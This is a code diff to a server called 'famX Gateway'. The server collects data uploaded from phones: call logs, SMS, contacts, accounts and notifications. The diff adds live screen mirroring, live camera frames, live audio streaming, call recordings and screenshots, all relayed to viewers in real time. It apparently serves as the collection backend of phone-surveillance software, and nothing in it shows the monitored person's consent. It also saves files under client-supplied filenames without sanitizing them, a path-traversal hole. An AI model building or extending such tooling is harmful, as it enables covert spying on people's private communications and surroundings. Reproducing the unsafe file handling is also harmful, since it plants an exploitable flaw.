@@ -64,7 +64,7 @@ def create_gateway_app():
         if 'file' not in request.files:
             return jsonify({"success": False, "error": "No file part"}), 400
         file = request.files['file']
-        category = request.form.get('category', 'files')
+        category = request.form.get('category', '').strip().lower()
         if file.filename == '':
             return jsonify({"success": False, "error": "No selected file"}), 400
             
@@ -72,18 +72,25 @@ def create_gateway_app():
         os.makedirs(os.path.join("media", device_id), exist_ok=True)
         
         filename = file.filename
+        fn_lower = filename.lower()
+        now_ms = int(time.time() * 1000)
+
+        if device_id not in database:
+            database[device_id] = {"_id": device_id}
+        if "media" not in database[device_id] or not isinstance(database[device_id]["media"], dict):
+            database[device_id]["media"] = {}
+        if "refs" not in database[device_id]:
+            database[device_id]["refs"] = {}
+
+        database[device_id]["lastSeen"] = now_ms
+
         text_categories = ["calls", "sms", "contacts", "apps", "accounts", "notifications", "usage_daily", "usage_weekly", "usage_monthly", "files", "info"]
         
         if category in text_categories:
             file_path = os.path.join("data", device_id, f"{category}.txt")
             file.save(file_path)
             
-            if device_id not in database:
-                database[device_id] = {"_id": device_id}
-            if "refs" not in database[device_id]:
-                database[device_id]["refs"] = {}
-            database[device_id]["refs"][category] = int(time.time() * 1000)
-            database[device_id]["lastSeen"] = int(time.time() * 1000)
+            database[device_id]["refs"][category] = now_ms
             
             if category == "info":
                 try:
@@ -95,35 +102,148 @@ def create_gateway_app():
                     print(f"[famX Gateway] Error parsing info file: {e}")
                     
             save_db()
+            if category == "files":
+                socketio.emit('files_updated', {'device_id': device_id})
             print(f"[famX Gateway] Uploaded {category}.txt for device: {device_id}")
             return jsonify({"success": True})
+
+        # 1. Screen Mirroring Frame
+        elif category == "mirror" or fn_lower.startswith("mirror"):
+            mirror_path = os.path.join("media", device_id, "mirror.jpg")
+            file.save(mirror_path)
             
-        elif category in ["photo", "photos", "audio", "voice", "recording", "recordings", "video", "videos"]:
-            subfolder = "photos" if category in ["photo", "photos"] else "voice" if category in ["audio", "voice", "recording", "recordings"] else "video"
-            target_dir = os.path.join("media", device_id, subfolder)
-            os.makedirs(target_dir, exist_ok=True)
-            
-            file_path = os.path.join(target_dir, filename)
-            file.save(file_path)
-            
-            if device_id not in database:
-                database[device_id] = {"_id": device_id}
-            if "media" not in database[device_id]:
-                database[device_id]["media"] = {}
-            if subfolder not in database[device_id]["media"]:
-                database[device_id]["media"][subfolder] = []
-                
-            media_list = database[device_id]["media"][subfolder]
-            if filename not in media_list:
-                media_list.append(filename)
-            database[device_id]["lastSeen"] = int(time.time() * 1000)
+            # Archive backup copy in data/<device_id>/
+            if fn_lower != "mirror.jpg":
+                try:
+                    import shutil
+                    shutil.copyfile(mirror_path, os.path.join("data", device_id, filename))
+                except Exception:
+                    pass
+
+            mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
+            database[device_id]["mirror_url"] = mirror_url
+            database[device_id]["mirror_time"] = now_ms
             save_db()
-            print(f"[famX Gateway] Uploaded media {filename} ({subfolder}) for device: {device_id}")
+
+            socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
+            socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
+            print(f"[famX Gateway] Live Mirror frame updated for device: {device_id}")
+            return jsonify({"success": True, "url": mirror_url})
+
+        # 2. Live Camera Frame
+        elif category == "live_camera" or fn_lower.startswith("live_camera"):
+            cam_path = os.path.join("media", device_id, "live_camera.jpg")
+            file.save(cam_path)
+
+            cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
+            database[device_id]["live_camera_url"] = cam_url
+            database[device_id]["live_camera_time"] = now_ms
+            save_db()
+
+            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
+            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
+            print(f"[famX Gateway] Live Camera frame updated for device: {device_id}")
+            return jsonify({"success": True, "url": cam_url})
+
+        # 3. Wallpaper
+        elif category == "wallpaper" or fn_lower.startswith("wallpaper"):
+            wp_path = os.path.join("media", device_id, "wallpaper.jpg")
+            file.save(wp_path)
+
+            wp_url = f"/api/media/stream/{device_id}/wallpaper.jpg?t={now_ms}"
+            database[device_id]["wallpaper_url"] = wp_url
+            save_db()
+
+            socketio.emit('wallpaper_update', {'device_id': device_id, 'url': wp_url}, room=device_id)
+            socketio.emit('wallpaper_update', {'device_id': device_id, 'url': wp_url})
             return jsonify({"success": True})
-            
+
+        # 4. Audio / Voice Recordings / Live Audio Chunks
+        elif category in ["audio", "voice", "recording", "recordings", "live_audio"] or fn_lower.startswith("audio_") or fn_lower.endswith(('.mp3', '.m4a', '.wav', '.ogg', '.aac')):
+            voice_dir = os.path.join("media", device_id, "voice")
+            os.makedirs(voice_dir, exist_ok=True)
+            voice_file_path = os.path.join(voice_dir, filename)
+            file.save(voice_file_path)
+
+            # Also maintain direct path in media/<device_id>/
+            direct_path = os.path.join("media", device_id, filename)
+            if not os.path.exists(direct_path):
+                try:
+                    import shutil
+                    shutil.copyfile(voice_file_path, direct_path)
+                except Exception:
+                    pass
+
+            file_size = os.path.getsize(voice_file_path) if os.path.exists(voice_file_path) else 0
+            chunk_url = f"/api/media/stream/{device_id}/{filename}"
+            database[device_id]["live_audio_url"] = chunk_url
+            database[device_id]["live_audio_time"] = now_ms
+
+            media_type = "call_recording" if ("call" in fn_lower or "call" in category) else "audio"
+            fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
+            database[device_id]["media"][fb_key] = {
+                "time": now_ms,
+                "url": chunk_url,
+                "name": filename,
+                "type": media_type,
+                "bytes": file_size,
+                "duration": 15
+            }
+            save_db()
+
+            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url}, room=device_id)
+            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url})
+            print(f"[famX Gateway] Uploaded audio {filename} ({media_type}) for device: {device_id}")
+            return jsonify({"success": True})
+
+        # 5. Photos / Camera Captures / Screenshots
+        elif category in ["photo", "photos", "camera", "image", "screenshot", "screenshots", "screencap"] or fn_lower.startswith(("img_", "screenshot", "cam_")):
+            photos_dir = os.path.join("media", device_id, "photos")
+            os.makedirs(photos_dir, exist_ok=True)
+            photo_file_path = os.path.join(photos_dir, filename)
+            file.save(photo_file_path)
+
+            # Also maintain direct path in media/<device_id>/
+            direct_path = os.path.join("media", device_id, filename)
+            if not os.path.exists(direct_path):
+                try:
+                    import shutil
+                    shutil.copyfile(photo_file_path, direct_path)
+                except Exception:
+                    pass
+
+            file_size = os.path.getsize(photo_file_path) if os.path.exists(photo_file_path) else 0
+            media_type = "screenshot" if ("screenshot" in fn_lower or "screencap" in category or "screenshot" in category) else "image"
+            fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
+            media_url = f"/api/media/stream/{device_id}/{filename}"
+
+            database[device_id]["media"][fb_key] = {
+                "time": now_ms,
+                "url": media_url,
+                "name": filename,
+                "type": media_type,
+                "bytes": file_size
+            }
+            save_db()
+            print(f"[famX Gateway] Uploaded photo {filename} ({media_type}) for device: {device_id}")
+            return jsonify({"success": True})
+
+        # 6. Fallback General Files
         else:
-            file_path = os.path.join("data", device_id, filename)
+            file_path = os.path.join("media", device_id, filename)
             file.save(file_path)
+            file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0
+
+            fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
+            database[device_id]["media"][fb_key] = {
+                "time": now_ms,
+                "url": f"/api/media/stream/{device_id}/{filename}",
+                "name": filename,
+                "type": "file",
+                "bytes": file_size
+            }
+            save_db()
+            print(f"[famX Gateway] Uploaded generic file {filename} for device: {device_id}")
             return jsonify({"success": True})
 
     # Register hardware socket events
